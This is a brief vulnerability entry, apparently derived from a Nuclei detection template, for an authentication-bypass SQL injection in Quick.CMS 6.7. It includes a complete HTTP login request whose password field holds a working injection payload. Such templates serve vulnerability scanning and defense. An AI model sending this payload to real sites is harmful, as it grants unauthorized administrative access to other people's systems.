# Vulnerability: Quick.CMS v6.7 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`quick-cms-sqli.yaml`)

## Description
Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability that allows for authentication bypass.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin.php?p=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true
```

